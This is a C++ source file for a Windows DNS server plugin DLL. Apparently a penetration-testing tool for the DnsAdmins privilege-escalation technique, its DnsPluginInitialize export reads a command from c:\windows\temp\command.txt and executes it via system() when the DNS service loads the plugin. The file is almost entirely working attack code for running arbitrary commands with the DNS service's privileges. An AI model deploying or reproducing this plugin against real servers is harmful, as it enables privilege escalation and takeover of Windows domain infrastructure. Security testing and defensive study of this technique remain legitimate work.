/*
 * Copyright (c) 2019 Karim Kanso. All Rights Reserved.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

// DNSAdmin-DLL.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>

#define COMMAND_MAX_LEN 4096

extern "C" __declspec(dllexport)
DWORD WINAPI DnsPluginInitialize(
	PVOID pDnsAllocateFunction,
	PVOID pDnsFreeFunction)
{
	FILE* f = NULL;
	if (fopen_s(&f, "c:\\windows\\temp\\command.txt", "r") == ERROR_SUCCESS)
	{
		char buffer[COMMAND_MAX_LEN];
		size_t read_len = fread_s(
			buffer,
			COMMAND_MAX_LEN,
			1,
			COMMAND_MAX_LEN,
			f
		);

		if (read_len > 0)
		{
			if (static_cast<unsigned char>(buffer[0]) == 0xff &&
				static_cast<unsigned char>(buffer[1]) == 0xfe)
			{
				wchar_t *cmd = reinterpret_cast<wchar_t*>(buffer + 2);
				for (int i = 0; i < (read_len/2) - 1; i++)
				{
					if (cmd[i] == '\n' || cmd[i] == '\r')
					{
						cmd[i] = '\0';
						_wsystem(cmd);
						break;
					}
				}
			}
			else
			{
				for (int i = 0; i < min(read_len + 1, COMMAND_MAX_LEN); i++)
				{
					if (buffer[i] == '\n' || buffer[i] == '\r')
					{
						buffer[i] = '\0';
						system(buffer);
						break;
					}
				}
			}
		}
		fclose(f);
	}
	return ERROR_SUCCESS;
}

extern "C" __declspec(dllexport)
DWORD WINAPI DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

extern "C" __declspec(dllexport)
DWORD WINAPI DnsPluginQuery(
	PSTR pszQueryName,
	WORD wQueryType,
	PSTR pszRecordOwnerName,
	PVOID ppDnsRecordListHead)
{
	return ERROR_SUCCESS;
}